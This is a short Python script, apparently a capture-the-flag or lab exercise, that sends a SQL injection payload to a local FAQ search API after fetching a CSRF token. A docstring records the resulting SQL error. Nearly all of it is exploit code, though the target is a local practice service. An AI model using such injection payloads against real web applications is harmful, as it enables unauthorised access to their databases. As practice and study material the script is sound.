#!/usr/bin/env python3

import httpx

BASE_URL = "http://127.0.0.1:50000"

client = httpx.Client()

r = client.get(BASE_URL + "/api/token")
token = r.json()["token"]

payload = "'a')))) SELECT question, answer FROM faqs; /*"
r = client.post(
    BASE_URL + "/api/search", headers={"X-CSRF-Token": token}, json={"query": payload}
)

"""
OperationalError: unrecognized token: "\"
SQL: 
WITH
  _q(v) AS (SELECT lower(coalesce(('), ''))),
  _p(p) AS (SELECT '%' || replace((SELECT v FROM _q), '%', '\\%') || '%')
SELECT question, answer
FROM faqs
WHERE status = 'published'
  AND lower(question) LIKE (SELECT p FROM _p) ESCAPE '\'
"""

data = r.json()
if isinstance(data, dict) and (err := data.get("error", None)):
    print(err)
else:
    print(data)
